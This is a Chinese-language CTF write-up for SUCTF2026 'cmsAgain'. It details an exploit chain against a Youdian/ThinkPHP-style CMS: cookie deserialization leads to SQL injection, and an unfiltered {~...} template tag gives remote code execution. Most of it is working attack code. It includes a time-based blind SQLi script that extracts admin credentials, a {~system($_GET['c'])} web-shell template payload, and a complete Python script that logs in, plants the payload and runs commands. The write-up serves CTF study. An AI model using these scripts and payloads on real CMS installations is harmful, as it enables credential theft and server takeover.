# SUCTF2026-cmsAgain

## 题目简述
题目是 Youdian/ThinkPHP 风格 CMS 利用链。附件源码量很大，关键不是完整框架文件列表，而是购物车 Cookie 反序列化、SQL 过滤和模板解析相关代码。前台购物车 Cookie 反序列化用户可控数据，ProductID 拼入 SQL 形成前台注入；通过盲注拿后台凭据后，利用模板装扮功能写入 `{~...}`，由模板引擎解析为 PHP，完成 RCE。

## 解题过程
这题的利用链很清晰:

1. 前台购物车 Cookie 直接 unserialize() 用户可控数据。

2. 反序列化后的 ProductID 被拼进 SQL，形成前台 SQL 注入。

3. 通过盲注读出后台管理员账号和密码。

4. 登录后台后，利用装扮功能把 {~...} 写进模板片段。

5. ThinkPHP 模板引擎会把 {~...} 解析成原生 PHP，形成后台到前台的模板执行。

6. 最终拿到 RCE，读取 flag。

前台购物车 Cookie 导致 SQL 注入

关键代码在 YdCart.class.php。

Cookie 名定义为:

```php
private $cookieName = 'y_shopping_cart';
```

项目配置里启用了 Cookie 前缀:

```
'COOKIE_PREFIX' => 'youdian'
```

所以线上真实 Cookie 名为:

```
youdiany_shopping_cart
```

读取 Cookie 时直接做了反序列化:

```php
$data = cookie($this->cookieName);
$data = unserialize(stripslashes($data));
```

对应位置:
- YdCart.class.php:14
- YdCart.class.php:15
- YdCart.class.php:51
- YdCart.class.php:52

真正危险的是 getTotalPrice($id) :

```php
$InfoID = $data[$id]['ProductID'];
$InfoPrice = $m->where("InfoID=$InfoID")->getField('InfoPrice');
```

对应位置:
- YdCart.class.php:305
- YdCart.class.php:312

这里的 $InfoID 完全来自 Cookie 中的 ProductID ，没有做任何过滤，直接拼接到:

$$
where InfoID=$InfoID
$$

因此形成 SQL 注入。

前台接口 setQuantity() 会调用 _setQuantity() ，然后继续调用:

$p['TotalItemPrice'] = $cart->getTotalPrice($id);

对应位置:
- PublicAction.class.php:1204
- PublicAction.class.php:1210

只要请求参数里给出 id=1 ，代码就会取:

$data[1]['ProductID']

一个最小可利用的购物车序列化数据如下:

```sql
a:1:{i:1;a:4:{
s:6:"CartID";i:1;
s:9:"ProductID";s:19:"0 union select 123#";
s:15:"ProductQuantity";i:1;
s:16:"AttributeValueID";s:0:"";
}}
```

把它 URL 编码后塞进 Cookie:

youdiany_shopping_cart=<urlencode 后的序列化数据>再访
问: /index.php/Home/Public/setQuantity?id=1&quantity=1 就会触发漏洞。

所以可以通过构造序列化数组，精确控制进入 SQL 的内容。

这里有一个很方便的特点: 数值型 union select 可以直接通过返回值验证注入是否成立。例如把
ProductID 设置成:

```sql
0 union select 123#
```

返回 JSON 中的 TotalItemPrice 会变成

```
{"TotalItemPrice":"123.00", ...}
```

这足够用于快速验注。

```python
import json
import urllib.parse

import requests

BASE = "http://<target>:10015/index.php/Home/Public/setQuantity?
id=1&quantity=1"

def make_cart_cookie(product_id: str) -> str:
raw = (
'a:1:{i:1;a:4:{'
's:6:"CartID";i:1;'
f's:9:"ProductID";s:{len(product_id)}:"{product_id}";'
's:15:"ProductQuantity";i:1;'
's:16:"AttributeValueID";s:0:"";'
'}}'
)
return urllib.parse.quote(raw, safe="")

payload = "0 union select 123#"
cookies = {"youdiany_shopping_cart": make_cart_cookie(payload)}

r = requests.get(BASE, cookies=cookies, timeout=10)
print(r.text)

data = r.json()
print("TotalItemPrice =", data["TotalItemPrice"])
```

完整脚本如下:

```python
import sys
import time
import urllib.parse

import requests

BASE = "http://<target>:10015/index.php/Home/Public/setQuantity?
id=1&quantity=1"
SLEEP_TIME = 0.6
THRESHOLD = 0.45

def make_cart_cookie(expr: str) -> str:
product_id = f"if(({expr}),sleep({SLEEP_TIME}),1)"
raw = (
'a:1:{i:1;a:4:{'
's:6:"CartID";i:1;'
f's:9:"ProductID";s:{len(product_id)}:"{product_id}";'
's:15:"ProductQuantity";i:1;'

's:16:"AttributeValueID";s:0:"";'
'}}'
)
return urllib.parse.quote(raw, safe="")

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

def hit(expr: str):
t0 = time.time()
r = session.get(
BASE,
cookies={"youdiany_shopping_cart": make_cart_cookie(expr)},
timeout=10,
)
dt = time.time() - t0
return dt > THRESHOLD, dt, r.status_code

def get_len(expr: str, max_len: int = 80) -> int:
lo, hi = 0, max_len
while lo < hi:
mid = (lo + hi + 1) // 2
ok, _, _ = hit(f"length(({expr}))>={mid}")
if ok:
lo = mid
else:
hi = mid - 1
return lo

def get_str(expr: str, max_len: int = 80) -> str:
n = get_len(expr, max_len)
out = ""
for i in range(1, n + 1):
lo, hi = 32, 126
while lo < hi:
mid = (lo + hi + 1) // 2
ok, _, _ = hit(f"ascii(substr(({expr}),{i},1))>={mid}")
if ok:
lo = mid
else:
hi = mid - 1
out += chr(lo)
print(f"[{i}/{n}] {out}")

sys.stdout.flush()
return out

targets = [
("db", "database()", 20),
("user", "user()", 40),
("admin_name", "(select AdminName from youdian_admin limit 0,1)", 20),
("admin_password", "(select AdminPassword from youdian_admin limit 0,1)",
80),
]

for label, expr, max_len in targets:
print(f"=== {label} ===")
value = get_str(expr, max_len)
print(f"{label}: {value}\n")
```

后台装扮功能导致模板执行

漏洞点在 DecorationAction.class.php 的 saveCode() :

```text
$fileName = "{$TemplatePath}Public/code.html";
$content = stripslashes($_POST['Content']);
$content = strip_tags($content, '<style><script><br>');
$result = YdInput::checkTemplateContent($content);
```

对应位置:
- DecorationAction.class.php:972
- DecorationAction.class.php:1006

写入目标是:

```
Public/code.html
```

saveCode() 额外禁用了这些内容:

```text
array('<php>', '</php>', '{:', '{$', 'sqllist')
```

但是没有禁用 {~...} 。

同时 checkTemplateContent() 的检测逻辑是:

```text
$pattern = '/{[$:]{1}([\s\S]+?)}/i';
```

这只会检查 {$...} 和 {:...} ，不会检查 {~...} 。

对应位置:
- common.php:498
- common.php:518

ThinkPHP 模板引擎 parseTag() 中明确写了:

```text
}elseif('~' == $flag){
return '<?php '.$name.';?>';
}
```

对应位置:
- ThinkTemplate.class.php:507
- ThinkTemplate.class.php:508

同时模板行为配置里:

```
'TMPL_DENY_FUNC_LIST' => 'echo,exit',
'TMPL_DENY_PHP' => false,
```

对应位置:
- ParseTemplateBehavior.class.php:25
- ParseTemplateBehavior.class.php:26

所以 {~system($_GET["c"])} 这种 payload 可以正常被执行。

为什么写进去后会在前台执行?

前台页脚模板里直接包含了这个片段:

```
<include file="Public:code" />
```

对应位置:
- footer.html:178

因此只要后台写入 Public/code.html ，前台页面渲染时就会包含并执行这段代码。

```python
import base64
import hashlib
import random
import re
import string
import sys
import urllib.parse

import requests

BASE = "http://<target>:10015"
PAGE_URL = BASE + "/"
ADMIN_NAME = "admin"
ADMIN_PASSWORD = "SUCTF@123!@#20260813"
PAYLOAD =
'{~print("CMDOUT_BEGIN\\n");system($_GET["c"]);print("\\nCMDOUT_END");}'

def safe_code(s: str) -> str:
chars = string.digits + string.ascii_letters
prefix = "".join(random.choice(chars) for _ in range(6))
suffix = "".join(random.choice(chars) for _ in range(6))
quoted = urllib.parse.quote(s, safe="~()*!.'")
encoded = base64.b64encode(quoted.encode()).decode()
return prefix + encoded + suffix

def login(session: requests.Session):
data = {
"username": hashlib.md5(ADMIN_NAME.encode()).hexdigest(),
"password": safe_code(ADMIN_PASSWORD),
"verifycode": "",

}
r = session.post(
BASE + "/index.php/Admin/Public/checkLogin/",
data=data,
timeout=15,
)
print("[login]", r.text)
j = r.json()
if j.get("status") != 3:
raise RuntimeError("admin login failed")

def get_code(session: requests.Session) -> str:
r = session.post(
BASE + "/index.php/Admin/Decoration/getCode",
data={"PageUrl": PAGE_URL},
timeout=15,
)
print("[getCode]", r.text[:200])
j = r.json()
if j.get("status") != 1:
raise RuntimeError("getCode failed")
return j["data"]

def save_code(session: requests.Session, content: str):
r = session.post(
BASE + "/index.php/Admin/Decoration/saveCode",
data={"PageUrl": PAGE_URL, "Content": content},
timeout=15,
)
print("[saveCode]", r.text[:200])
j = r.json()
if j.get("status") != 1:
raise RuntimeError("saveCode failed")

def run_cmd(session: requests.Session, cmd: str) -> str:
r = session.get(PAGE_URL, params={"c": cmd}, timeout=20)
m = re.search(r"CMDOUT_BEGIN\s*(.*?)\s*CMDOUT_END", r.text, re.S)
if m:
return m.group(1).strip()
return r.text

def main():
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})

backup = None
try:
login(s)
backup = get_code(s)
save_code(s, PAYLOAD)
out = run_cmd(s, cmd)
print(out)
finally:
if backup is not None:
try:
save_code(s, backup)
print("[restore] ok")
except Exception as e:
print("[restore] failed:", e)

if __name__ == "__main__":
main()
```

```
python admin_rce.py id
python admin_rce.py "ls -al /"
python admin_rce.py "cat /b2b27f1a12e1f4bcb3927024bdb92531.txt"

SUCTF{y0ud1an_c00l_LiHua}
```

Misc

## 方法总结
- 核心技巧：CMS 反序列化到 SQLi 到模板执行
- 识别信号：前台 Cookie 被反序列化并参与 SQL，后台模板支持特殊 PHP 执行语法。
- 复用要点：先从前台盲注拿后台权限，再找可写模板入口，把模板语法转成 RCE。
